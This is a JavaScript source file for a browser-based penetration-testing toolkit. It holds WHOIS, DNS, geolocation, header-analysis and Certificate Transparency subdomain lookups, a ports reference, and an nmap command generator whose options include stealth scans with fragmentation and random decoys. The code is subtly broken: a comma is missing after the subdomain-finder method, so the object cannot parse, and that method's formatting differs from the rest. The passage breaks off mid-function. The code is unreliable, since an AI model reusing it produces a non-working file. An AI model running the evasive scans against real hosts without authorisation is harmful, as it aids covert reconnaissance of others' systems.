/* ==========================================================================
   SEC ASSEM — Professional Cybersecurity Pentesting Toolkit
   Main Application JavaScript
   ========================================================================== */

const SecAssem = {
    currentTool: null,
    activeTab: {},
    findingCount: 0,

    /* ======================================================================
       INITIALIZATION
       ====================================================================== */
    init() {
        this.setupSidebar();
        this.setupSearch();
        this.showWelcome();
        this.startTypingAnimation();
        // Hide all tool panels initially
        document.querySelectorAll('.tool-panel').forEach(p => p.style.display = 'none');
    },

    /* ======================================================================
       NAVIGATION
       ====================================================================== */
    navigateTo(toolId) {
        // Hide welcome
        const ws = document.getElementById('welcome-screen');
        if (ws) ws.style.display = 'none';
        // Hide all panels
        document.querySelectorAll('.tool-panel').forEach(p => p.style.display = 'none');
        // Show selected
        const panel = document.getElementById(toolId);
        if (!panel) return;
        panel.style.display = 'block';
        panel.classList.add('animate-in');
        setTimeout(() => panel.classList.remove('animate-in'), 500);

        this.currentTool = toolId;

        // Update breadcrumb
        const title = panel.getAttribute('data-title') || toolId;
        const cat = panel.getAttribute('data-category') || '';
        document.getElementById('breadcrumb-sep').style.display = 'inline';
        document.getElementById('breadcrumb-current').textContent = (cat ? cat + ' / ' : '') + title;

        // Highlight nav
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        const navItem = document.querySelector(`.nav-item[data-tool="${toolId}"]`);
        if (navItem) {
            navItem.classList.add('active');
            // Expand parent category
            const cat = navItem.closest('.nav-category');
            if (cat) cat.classList.add('expanded');
        }

        // Close mobile sidebar
        if (window.innerWidth < 768) {
            document.getElementById('sidebar').classList.remove('open');
        }

        // Auto-load for port scanner
        if (toolId === 'port-scanner') this.tools.portScanner();
    },

    showWelcome() {
        document.querySelectorAll('.tool-panel').forEach(p => p.style.display = 'none');
        const ws = document.getElementById('welcome-screen');
        if (ws) ws.style.display = 'block';
        document.getElementById('breadcrumb-sep').style.display = 'none';
        document.getElementById('breadcrumb-current').textContent = '';
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        this.currentTool = null;
    },

    /* ======================================================================
       SIDEBAR
       ====================================================================== */
    setupSidebar() {
        document.querySelectorAll('.nav-category-header').forEach(header => {
            header.addEventListener('click', () => {
                const cat = header.closest('.nav-category');
                cat.classList.toggle('expanded');
            });
        });
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', () => {
                const toolId = item.getAttribute('data-tool');
                if (toolId) this.navigateTo(toolId);
            });
        });
    },

    toggleSidebar() {
        const sidebar = document.getElementById('sidebar');
        sidebar.classList.toggle('open');
    },

    setupSearch() {
        const searchInput = document.getElementById('tool-search');
        if (!searchInput) return;
        searchInput.addEventListener('input', () => {
            const q = searchInput.value.toLowerCase().trim();
            document.querySelectorAll('.nav-item').forEach(item => {
                const text = item.textContent.toLowerCase();
                item.style.display = text.includes(q) || !q ? '' : 'none';
            });
            document.querySelectorAll('.nav-category').forEach(cat => {
                const visible = cat.querySelectorAll('.nav-item[style=""], .nav-item:not([style])');
                if (q) cat.classList.add('expanded');
                else cat.classList.remove('expanded');
            });
        });
    },

    /* ======================================================================
       TYPING ANIMATION
       ====================================================================== */
    startTypingAnimation() {
        const phrases = [
            'Initializing security modules...',
            'Ready for penetration testing.',
            'All 25+ tools at your command.',
            'Generate payloads. Analyze targets. Build reports.',
            'SEC ASSEM — Your security arsenal.'
        ];
        let phraseIndex = 0, charIndex = 0, isDeleting = false;
        const el = document.getElementById('typing-text');
        if (!el) return;

        function type() {
            const current = phrases[phraseIndex];
            if (!isDeleting) {
                el.textContent = current.substring(0, charIndex + 1);
                charIndex++;
                if (charIndex === current.length) {
                    isDeleting = true;
                    setTimeout(type, 2000);
                    return;
                }
                setTimeout(type, 50);
            } else {
                el.textContent = current.substring(0, charIndex - 1);
                charIndex--;
                if (charIndex === 0) {
                    isDeleting = false;
                    phraseIndex = (phraseIndex + 1) % phrases.length;
                    setTimeout(type, 500);
                    return;
                }
                setTimeout(type, 30);
            }
        }
        setTimeout(type, 1000);
    },

    /* ======================================================================
       UI UTILITIES
       ====================================================================== */
    showToast(message, type = 'info') {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        const icons = { success: '✓', error: '✗', warning: '⚠', info: 'ℹ' };
        toast.innerHTML = `<span class="toast-icon">${icons[type] || 'ℹ'}</span><span class="toast-msg">${message}</span>`;
        container.appendChild(toast);
        setTimeout(() => { toast.classList.add('toast-exit'); setTimeout(() => toast.remove(), 400); }, 4000);
    },

    showModal(title, content) {
        document.getElementById('modal-title').textContent = title;
        document.getElementById('modal-body').innerHTML = content;
        document.getElementById('modal-overlay').classList.add('active');
    },

    closeModal() {
        document.getElementById('modal-overlay').classList.remove('active');
    },

    async copyToClipboard(text) {
        try {
            await navigator.clipboard.writeText(text);
            this.showToast('Copied to clipboard!', 'success');
        } catch { this.showToast('Failed to copy', 'error'); }
    },

    showLoading(containerId) {
        const el = document.getElementById(containerId);
        if (el) el.innerHTML = '<div class="loading-spinner"><div class="spinner"></div><span>Processing...</span></div>';
    },

    hideLoading(containerId) {
        const el = document.getElementById(containerId);
        if (el) el.innerHTML = '';
    },

    escapeHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    downloadFile(filename, content, mime = 'text/plain') {
        const blob = new Blob([content], { type: mime });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        a.click();
        URL.revokeObjectURL(a.href);
    },

    switchTab(btn, toolId) {
        const nav = btn.closest('.tab-nav');
        nav.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        this.activeTab[toolId] = btn.getAttribute('data-tab');
    },

    togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') { input.type = 'text'; btn.textContent = '🙈'; }
        else { input.type = 'password'; btn.textContent = '👁️'; }
    },

    makePayloadList(payloads, title) {
        let html = `<div class="payload-list-header"><h4>${this.escapeHtml(title)}</h4>
            <button class="btn-secondary btn-sm" onclick="SecAssem.copyToClipboard(${JSON.stringify(payloads.join('\n')).replace(/'/g, "\\'")})">Copy All</button></div>
            <div class="payload-list">`;
        payloads.forEach((p, i) => {
            html += `<div class="payload-item"><code>${this.escapeHtml(p)}</code>
                <button class="copy-btn" onclick="SecAssem.copyToClipboard(decodeURIComponent('${encodeURIComponent(p)}'))">📋</button></div>`;
        });
        html += '</div>';
        return html;
    },

    /* ======================================================================
       MD5 Implementation (compact)
       ====================================================================== */
    md5: (function () {
        function safeAdd(x, y) { var l = (x & 0xFFFF) + (y & 0xFFFF); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xFFFF); }
        function bitRotateLeft(n, c) { return (n << c) | (n >>> (32 - c)); }
        function md5cmn(q, a, b, x, s, t) { return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
        function md5ff(a, b, c, d, x, s, t) { return md5cmn((b & c) | ((~b) & d), a, b, x, s, t); }
        function md5gg(a, b, c, d, x, s, t) { return md5cmn((b & d) | (c & (~d)), a, b, x, s, t); }
        function md5hh(a, b, c, d, x, s, t) { return md5cmn(b ^ c ^ d, a, b, x, s, t); }
        function md5ii(a, b, c, d, x, s, t) { return md5cmn(c ^ (b | (~d)), a, b, x, s, t); }
        function binlMD5(x, len) {
            x[len >> 5] |= 0x80 << (len % 32); x[(((len + 64) >>> 9) << 4) + 14] = len;
            var a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
            for (var i = 0; i < x.length; i += 16) {
                var oa = a, ob = b, oc = c, od = d;
                a = md5ff(a, b, c, d, x[i], 7, -680876936); d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
                c = md5ff(c, d, a, b, x[i + 2], 17, 606105819); b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
                a = md5ff(a, b, c, d, x[i + 4], 7, -176418897); d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
                c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341); b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
                a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416); d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
                c = md5ff(c, d, a, b, x[i + 10], 17, -42063); b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
                a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682); d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
                c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290); b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);
                a = md5gg(a, b, c, d, x[i + 1], 5, -165796510); d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
                c = md5gg(c, d, a, b, x[i + 11], 14, 643717713); b = md5gg(b, c, d, a, x[i], 20, -373897302);
                a = md5gg(a, b, c, d, x[i + 5], 5, -701558691); d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
                c = md5gg(c, d, a, b, x[i + 15], 14, -660478335); b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
                a = md5gg(a, b, c, d, x[i + 9], 5, 568446438); d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
                c = md5gg(c, d, a, b, x[i + 3], 14, -187363961); b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
                a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467); d = md5gg(d, a, b, c, x[i + 6], 9, -51403784);
                c = md5gg(c, d, a, b, x[i + 11], 14, 1735328473); b = md5gg(b, c, d, a, x[i + 2], 20, -1926607734);
                a = md5hh(a, b, c, d, x[i + 5], 4, -378558); d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
                c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562); b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
                a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060); d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
                c = md5hh(c, d, a, b, x[i + 7], 16, -155497632); b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
                a = md5hh(a, b, c, d, x[i + 13], 4, 681279174); d = md5hh(d, a, b, c, x[i + 0], 11, -358537222);
                c = md5hh(c, d, a, b, x[i + 3], 16, -722521979); b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
                a = md5hh(a, b, c, d, x[i + 9], 4, -640364487); d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
                c = md5hh(c, d, a, b, x[i + 15], 16, 530742520); b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);
                a = md5ii(a, b, c, d, x[i], 6, -198630844); d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
                c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905); b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
                a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571); d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
                c = md5ii(c, d, a, b, x[i + 10], 15, -1051523); b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
                a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359); d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
                c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380); b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
                a = md5ii(a, b, c, d, x[i + 4], 6, -145523070); d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
                c = md5ii(c, d, a, b, x[i + 2], 15, 718787259); b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);
                a = safeAdd(a, oa); b = safeAdd(b, ob); c = safeAdd(c, oc); d = safeAdd(d, od);
            }
            return [a, b, c, d];
        }
        function rstrMD5(s) {
            var x = [], i; for (i = 0; i < s.length * 8; i += 8) x[i >> 5] |= (s.charCodeAt(i / 8) & 0xFF) << (i % 32);
            var bin = binlMD5(x, s.length * 8), r = '';
            for (i = 0; i < bin.length * 32; i += 8) r += String.fromCharCode((bin[i >> 5] >>> (i % 32)) & 0xFF);
            return r;
        }
        function hexMD5(s) {
            var hex = '0123456789abcdef', r = '', x = rstrMD5(unescape(encodeURIComponent(s)));
            for (var i = 0; i < x.length; i++) { var c = x.charCodeAt(i); r += hex.charAt((c >>> 4) & 0x0F) + hex.charAt(c & 0x0F); }
            return r;
        }
        return hexMD5;
    })(),

    /* ======================================================================
       SHA Hash via Web Crypto API
       ====================================================================== */
    async sha(algo, text) {
        const encoder = new TextEncoder();
        const data = encoder.encode(text);
        const hashBuffer = await crypto.subtle.digest(algo, data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    },

    /* ======================================================================
       TOOLS
       ====================================================================== */
    tools: {

        /* ===== WHOIS Lookup ===== */
        async whoisLookup() {
            const domain = document.getElementById('whois-lookup-domain').value.trim();
            if (!domain) { SecAssem.showToast('Please enter a domain or IP', 'warning'); return; }
            SecAssem.showLoading('whois-lookup-results');
            try {
                const r = await fetch(`https://da.gd/w/${encodeURIComponent(domain)}`);
                if (!r.ok) throw new Error('Lookup failed');
                const text = await r.text();
                document.getElementById('whois-lookup-results').innerHTML =
                    `<div class="result-header"><h4>WHOIS Results for ${SecAssem.escapeHtml(domain)}</h4>
                    <button class="copy-btn" onclick="SecAssem.copyToClipboard(document.getElementById('whois-raw').textContent)">📋 Copy</button></div>
                    <pre class="code-block" id="whois-raw">${SecAssem.escapeHtml(text)}</pre>`;
            } catch (e) {
                document.getElementById('whois-lookup-results').innerHTML =
                    `<div class="result-header"><h4>WHOIS Lookup</h4></div>
                    <p>Direct lookup unavailable. <a href="https://whois.domaintools.com/${encodeURIComponent(domain)}" target="_blank" rel="noopener">Check on DomainTools →</a></p>
                    <p>Or try: <a href="https://who.is/whois/${encodeURIComponent(domain)}" target="_blank" rel="noopener">who.is →</a></p>`;
            }
        },

        /* ===== DNS Lookup ===== */
        async dnsLookup() {
            const domain = document.getElementById('dns-lookup-domain').value.trim();
            const type = document.getElementById('dns-lookup-type').value;
            if (!domain) { SecAssem.showToast('Please enter a domain', 'warning'); return; }
            SecAssem.showLoading('dns-lookup-results');
            try {
                const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`);
                const data = await r.json();
                let html = `<div class="result-header"><h4>DNS Records — ${SecAssem.escapeHtml(domain)} (${type})</h4></div>`;
                if (data.Answer && data.Answer.length) {
                    html += `<table class="data-table"><thead><tr><th>Name</th><th>Type</th><th>TTL</th><th>Data</th></tr></thead><tbody>`;
                    const typeMap = { 1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA', 15: 'MX', 16: 'TXT', 28: 'AAAA' };
                    data.Answer.forEach(a => {
                        html += `<tr><td>${SecAssem.escapeHtml(a.name)}</td><td>${typeMap[a.type] || a.type}</td><td>${a.TTL}s</td><td><code>${SecAssem.escapeHtml(a.data)}</code></td></tr>`;
                    });
                    html += '</tbody></table>';
                } else {
                    html += `<p class="no-results">No ${type} records found for ${SecAssem.escapeHtml(domain)}</p>`;
                }
                if (data.Authority) {
                    html += `<details class="result-details"><summary>Authority Records (${data.Authority.length})</summary><pre class="code-block">${SecAssem.escapeHtml(JSON.stringify(data.Authority, null, 2))}</pre></details>`;
                }
                document.getElementById('dns-lookup-results').innerHTML = html;
            } catch (e) {
                SecAssem.showToast('DNS lookup failed: ' + e.message, 'error');
                SecAssem.hideLoading('dns-lookup-results');
            }
        },

        /* ===== IP Geolocation ===== */
        async ipGeo() {
            const ip = document.getElementById('ip-geo-ip').value.trim();
            if (!ip) { SecAssem.showToast('Please enter an IP address', 'warning'); return; }
            SecAssem.showLoading('ip-geo-results');
            try {
                const r = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`);
                const d = await r.json();
                if (d.error) throw new Error(d.reason || 'Invalid IP');
                document.getElementById('ip-geo-results').innerHTML = `
                    <div class="result-header"><h4>Geolocation — ${SecAssem.escapeHtml(ip)}</h4></div>
                    <div class="geo-grid">
                        <div class="geo-card"><span class="geo-label">Country</span><span class="geo-value">${SecAssem.escapeHtml(d.country_name || 'N/A')} ${d.country_code ? '(' + d.country_code + ')' : ''}</span></div>
                        <div class="geo-card"><span class="geo-label">Region</span><span class="geo-value">${SecAssem.escapeHtml(d.region || 'N/A')}</span></div>
                        <div class="geo-card"><span class="geo-label">City</span><span class="geo-value">${SecAssem.escapeHtml(d.city || 'N/A')}</span></div>
                        <div class="geo-card"><span class="geo-label">ISP / Org</span><span class="geo-value">${SecAssem.escapeHtml(d.org || 'N/A')}</span></div>
                        <div class="geo-card"><span class="geo-label">ASN</span><span class="geo-value">${SecAssem.escapeHtml(d.asn || 'N/A')}</span></div>
                        <div class="geo-card"><span class="geo-label">Timezone</span><span class="geo-value">${SecAssem.escapeHtml(d.timezone || 'N/A')}</span></div>
                        <div class="geo-card"><span class="geo-label">Latitude</span><span class="geo-value">${d.latitude || 'N/A'}</span></div>
                        <div class="geo-card"><span class="geo-label">Longitude</span><span class="geo-value">${d.longitude || 'N/A'}</span></div>
                    </div>`;
            } catch (e) {
                SecAssem.showToast('Geolocation failed: ' + e.message, 'error');
                SecAssem.hideLoading('ip-geo-results');
            }
        },

        /* ===== Reverse DNS ===== */
        async reverseDns() {
            const ip = document.getElementById('reverse-dns-ip').value.trim();
            if (!ip) { SecAssem.showToast('Please enter an IP address', 'warning'); return; }
            SecAssem.showLoading('reverse-dns-results');
            try {
                const parts = ip.split('.').reverse().join('.');
                const r = await fetch(`https://dns.google/resolve?name=${parts}.in-addr.arpa&type=PTR`);
                const data = await r.json();
                let html = `<div class="result-header"><h4>Reverse DNS — ${SecAssem.escapeHtml(ip)}</h4></div>`;
                if (data.Answer && data.Answer.length) {
                    html += '<div class="payload-list">';
                    data.Answer.forEach(a => { html += `<div class="payload-item"><code>${SecAssem.escapeHtml(a.data)}</code></div>`; });
                    html += '</div>';
                } else {
                    html += '<p class="no-results">No PTR records found.</p>';
                }
                document.getElementById('reverse-dns-results').innerHTML = html;
            } catch (e) {
                SecAssem.showToast('Reverse DNS failed: ' + e.message, 'error');
                SecAssem.hideLoading('reverse-dns-results');
            }
        },

        /* ===== HTTP Header Analyzer ===== */
        async headerAnalyzer() {
            const url = document.getElementById('header-analyzer-url').value.trim();
            if (!url) { SecAssem.showToast('Please enter a URL', 'warning'); return; }
            SecAssem.showLoading('header-analyzer-results');
            try {
                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
                const r = await fetch(proxyUrl);
                const secHeaders = [
                    { name: 'content-security-policy', label: 'Content-Security-Policy', weight: 20 },
                    { name: 'strict-transport-security', label: 'Strict-Transport-Security', weight: 15 },
                    { name: 'x-frame-options', label: 'X-Frame-Options', weight: 15 },
                    { name: 'x-content-type-options', label: 'X-Content-Type-Options', weight: 10 },
                    { name: 'referrer-policy', label: 'Referrer-Policy', weight: 10 },
                    { name: 'permissions-policy', label: 'Permissions-Policy', weight: 10 },
                    { name: 'x-xss-protection', label: 'X-XSS-Protection', weight: 5 },
                    { name: 'cache-control', label: 'Cache-Control', weight: 5 },
                    { name: 'x-permitted-cross-domain-policies', label: 'X-Permitted-Cross-Domain-Policies', weight: 5 },
                    { name: 'cross-origin-opener-policy', label: 'Cross-Origin-Opener-Policy', weight: 5 },
                ];

                let score = 0;
                let html = `<div class="result-header"><h4>Security Header Analysis — ${SecAssem.escapeHtml(url)}</h4></div>`;
                html += `<table class="data-table"><thead><tr><th>Header</th><th>Value</th><th>Status</th></tr></thead><tbody>`;

                secHeaders.forEach(h => {
                    const val = r.headers.get(h.name);
                    const present = !!val;
                    if (present) score += h.weight;
                    html += `<tr><td><strong>${h.label}</strong></td><td>${present ? `<code>${SecAssem.escapeHtml(val)}</code>` : '—'}</td>
                        <td><span class="badge ${present ? 'severity-low' : 'severity-high'}">${present ? '✓ Present' : '✗ Missing'}</span></td></tr>`;
                });

                html += '</tbody></table>';

                const scoreClass = score >= 80 ? 'severity-low' : score >= 50 ? 'severity-medium' : 'severity-high';
                html = `<div class="score-badge ${scoreClass}">Security Score: ${score}/100</div>` + html;

                // Show all response headers
                html += '<details class="result-details"><summary>All Response Headers</summary><table class="data-table"><tbody>';
                r.headers.forEach((v, k) => { html += `<tr><td><strong>${SecAssem.escapeHtml(k)}</strong></td><td><code>${SecAssem.escapeHtml(v)}</code></td></tr>`; });
                html += '</tbody></table></details>';

                document.getElementById('header-analyzer-results').innerHTML = html;
            } catch (e) {
                document.getElementById('header-analyzer-results').innerHTML =
                    `<p class="no-results">Could not analyze headers. This may be due to CORS restrictions. Try the URL directly or use curl.</p>
                    <pre class="code-block">curl -I ${SecAssem.escapeHtml(url)}</pre>`;
            }
        },

       /* ===== Subdomain Finder ===== */
async subdomainFinder() {
    const input = document.getElementById(
        'subdomain-finder-domain'
    );

    const results = document.getElementById(
        'subdomain-finder-results'
    );

    const domain = (input?.value || '')
        .trim()
        .toLowerCase()
        .replace(/\.$/, '');

    if (!domain) {
        SecAssem.showToast(
            'Please enter a domain',
            'warning'
        );
        return;
    }

    const domainRegex =
        /^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/i;

    if (!domainRegex.test(domain)) {
        SecAssem.showToast(
            'Please enter a valid domain',
            'warning'
        );
        return;
    }

    SecAssem.showLoading(
        'subdomain-finder-results'
    );

    try {
        const controller = new AbortController();

        const timeout = setTimeout(() => {
            controller.abort();
        }, 20000);

        let response;

        try {
            response = await fetch(
                `/api/ct?domain=${encodeURIComponent(domain)}`,
                {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    },
                    signal: controller.signal,
                    cache: 'no-store'
                }
            );
        } finally {
            clearTimeout(timeout);
        }

        let data;

        try {
            data = await response.json();
        } catch {
            throw new Error(
                `Invalid response from CT service (HTTP ${response.status})`
            );
        }

        if (!response.ok) {
            throw new Error(
                data.error ||
                `CT service returned HTTP ${response.status}`
            );
        }

        if (
            !data.success ||
            !Array.isArray(data.subdomains)
        ) {
            throw new Error(
                'Unexpected CT service response'
            );
        }

        const subdomains = data.subdomains
            .map(name =>
                String(name)
                    .trim()
                    .toLowerCase()
                    .replace(/^\*\./, '')
                    .replace(/\.$/, '')
            )
            .filter(Boolean);

        const unique = [
            ...new Set(subdomains)
        ].sort((a, b) =>
            a.localeCompare(b)
        );

        results.replaceChildren();

        const header =
            document.createElement('div');

        header.className =
            'result-header';

        const heading =
            document.createElement('h4');

        heading.textContent =
            `Subdomains Found: ${unique.length}`;

        const actions =
            document.createElement('div');

        actions.className =
            'btn-row';

        const copyButton =
            document.createElement('button');

        copyButton.type = 'button';
        copyButton.className =
            'btn-secondary btn-sm';
        copyButton.textContent =
            '📋 Copy All';

        copyButton.addEventListener(
            'click',
            () => {
                SecAssem.copyToClipboard(
                    unique.join('\n')
                );
            }
        );

        const exportButton =
            document.createElement('button');

        exportButton.type = 'button';
        exportButton.className =
            'btn-secondary btn-sm';
        exportButton.textContent =
            '⬇ Export';

        exportButton.addEventListener(
            'click',
            () => {
                SecAssem.downloadFile(
                    `subdomains_${domain}.txt`,
                    unique.join('\n'),
                    'text/plain;charset=utf-8'
                );
            }
        );

        actions.append(
            copyButton,
            exportButton
        );

        header.append(
            heading,
            actions
        );

        results.appendChild(header);

        if (!unique.length) {
            const empty =
                document.createElement('p');

            empty.className =
                'no-results';

            empty.textContent =
                `No Certificate Transparency subdomains were found for ${domain}.`;

            results.appendChild(empty);

            SecAssem.showToast(
                'No subdomains found in Certificate Transparency logs',
                'info'
            );

            return;
        }

        const list =
            document.createElement('div');

        list.className =
            'payload-list';

        unique.forEach(subdomain => {
            const row =
                document.createElement('div');

            row.className =
                'payload-item';

            const code =
                document.createElement('code');

            code.textContent =
                subdomain;

            const copy =
                document.createElement('button');

            copy.type = 'button';
            copy.className =
                'copy-btn';

            copy.textContent =
                '📋';

            copy.title =
                `Copy ${subdomain}`;

            copy.setAttribute(
                'aria-label',
                `Copy ${subdomain}`
            );

            copy.addEventListener(
                'click',
                () => {
                    SecAssem.copyToClipboard(
                        subdomain
                    );
                }
            );

            row.append(
                code,
                copy
            );

            list.appendChild(row);
        });

        results.appendChild(list);

        SecAssem.showToast(
            `Found ${unique.length} unique subdomains`,
            'success'
        );
    } catch (error) {
        results.replaceChildren();

        const box =
            document.createElement('div');

        box.className =
            'browser-limit-card';

        const heading =
            document.createElement('h4');

        heading.textContent =
            'Subdomain lookup failed';

        const message =
            document.createElement('p');

        if (error.name === 'AbortError') {
            message.textContent =
                'Certificate Transparency lookup timed out after 20 seconds.';
        } else {
            message.textContent =
                error.message ||
                'Unable to query Certificate Transparency logs.';
        }

        const direct =
            document.createElement('a');

        direct.href =
            `https://crt.sh/?q=%25.${encodeURIComponent(domain)}`;

        direct.target =
            '_blank';

        direct.rel =
            'noopener noreferrer';

        direct.textContent =
            'Open crt.sh directly →';

        box.append(
            heading,
            message,
            direct
        );

        results.appendChild(box);

        SecAssem.showToast(
            'Subdomain lookup failed',
            'error'
        );

        console.error(
            '[SEC ASSEM] Subdomain Finder:',
            error
        );
    }
}
        /* ===== Port Scanner Reference ===== */
        portScanner() {
            const ports = [
                { port: 21, service: 'FTP', proto: 'TCP', desc: 'File Transfer Protocol', risk: 'High' },
                { port: 22, service: 'SSH', proto: 'TCP', desc: 'Secure Shell', risk: 'Medium' },
                { port: 23, service: 'Telnet', proto: 'TCP', desc: 'Unencrypted Remote Access', risk: 'Critical' },
                { port: 25, service: 'SMTP', proto: 'TCP', desc: 'Simple Mail Transfer Protocol', risk: 'Medium' },
                { port: 53, service: 'DNS', proto: 'TCP/UDP', desc: 'Domain Name System', risk: 'Medium' },
                { port: 80, service: 'HTTP', proto: 'TCP', desc: 'Hypertext Transfer Protocol', risk: 'Medium' },
                { port: 110, service: 'POP3', proto: 'TCP', desc: 'Post Office Protocol v3', risk: 'High' },
                { port: 111, service: 'RPCbind', proto: 'TCP/UDP', desc: 'Remote Procedure Call', risk: 'High' },
                { port: 135, service: 'MSRPC', proto: 'TCP', desc: 'Microsoft RPC', risk: 'High' },
                { port: 139, service: 'NetBIOS', proto: 'TCP', desc: 'NetBIOS Session Service', risk: 'Critical' },
                { port: 143, service: 'IMAP', proto: 'TCP', desc: 'Internet Message Access Protocol', risk: 'Medium' },
                { port: 443, service: 'HTTPS', proto: 'TCP', desc: 'HTTP over TLS/SSL', risk: 'Low' },
                { port: 445, service: 'SMB', proto: 'TCP', desc: 'Server Message Block', risk: 'Critical' },
                { port: 993, service: 'IMAPS', proto: 'TCP', desc: 'IMAP over SSL', risk: 'Low' },
                { port: 995, service: 'POP3S', proto: 'TCP', desc: 'POP3 over SSL', risk: 'Low' },
                { port: 1433, service: 'MSSQL', proto: 'TCP', desc: 'Microsoft SQL Server', risk: 'Critical' },
                { port: 1521, service: 'Oracle', proto: 'TCP', desc: 'Oracle Database', risk: 'Critical' },
                { port: 3306, service: 'MySQL', proto: 'TCP', desc: 'MySQL Database', risk: 'Critical' },
                { port: 3389, service: 'RDP', proto: 'TCP', desc: 'Remote Desktop Protocol', risk: 'Critical' },
                { port: 5432, service: 'PostgreSQL', proto: 'TCP', desc: 'PostgreSQL Database', risk: 'Critical' },
                { port: 5900, service: 'VNC', proto: 'TCP', desc: 'Virtual Network Computing', risk: 'High' },
                { port: 6379, service: 'Redis', proto: 'TCP', desc: 'Redis Key-Value Store', risk: 'Critical' },
                { port: 8080, service: 'HTTP-Alt', proto: 'TCP', desc: 'Alternative HTTP', risk: 'Medium' },
                { port: 8443, service: 'HTTPS-Alt', proto: 'TCP', desc: 'Alternative HTTPS', risk: 'Medium' },
                { port: 27017, service: 'MongoDB', proto: 'TCP', desc: 'MongoDB Database', risk: 'Critical' },
            ];
            const filter = (document.getElementById('port-scanner-search').value || '').toLowerCase();
            const filtered = filter ? ports.filter(p => `${p.port} ${p.service} ${p.proto} ${p.desc}`.toLowerCase().includes(filter)) : ports;

            let html = `<div class="result-header"><h4>Common Ports Reference (${filtered.length})</h4></div>`;
            html += `<table class="data-table"><thead><tr><th>Port</th><th>Service</th><th>Protocol</th><th>Description</th><th>Risk</th></tr></thead><tbody>`;
            filtered.forEach(p => {
                const riskClass = { Critical: 'severity-critical', High: 'severity-high', Medium: 'severity-medium', Low: 'severity-low' }[p.risk] || 'severity-info';
                html += `<tr><td><strong>${p.port}</strong></td><td>${p.service}</td><td>${p.proto}</td><td>${p.desc}</td><td><span class="badge ${riskClass}">${p.risk}</span></td></tr>`;
            });
            html += '</tbody></table>';
            document.getElementById('port-scanner-results').innerHTML = html;
        },

        generateNmap() {
            const target = document.getElementById('port-scanner-target').value.trim();
            if (!target) { SecAssem.showToast('Please enter a target IP/range', 'warning'); return; }
            const cmds = [
                { label: 'Quick Scan', cmd: `nmap -sV -T4 ${target}` },
                { label: 'Full TCP Scan', cmd: `nmap -sS -sV -sC -p- ${target}` },
                { label: 'Top 1000 Ports', cmd: `nmap -sV -sC --top-ports 1000 ${target}` },
                { label: 'UDP Scan', cmd: `nmap -sU -sV --top-ports 100 ${target}` },
                { label: 'Aggressive Scan', cmd: `nmap -A -T4 -p- ${target}` },
                { label: 'Stealth Scan', cmd: `nmap -sS -T2 -f -D RND:5 ${target}` },
                { label: 'Vuln Scan', cmd: `nmap -sV --script=vuln ${target}` },
                { label: 'OS Detection', cmd: `nmap -O -sV ${target}` },
            ];
            let html = '<div class="result-header"><h4>Nmap Commands</h4></div><div class="payload-list">';
            cmds.forEach(c => {
                html += `<div class="payload-item"><span class="payload-label">${c.label}</span><code>${SecAssem.escapeHtml(c.cmd)}</code>
                    <button class="copy-btn" onclick="SecAssem.copyToClipboard('${c.cmd.replace(/'/g, "\\'")}')">📋</button></div>`;
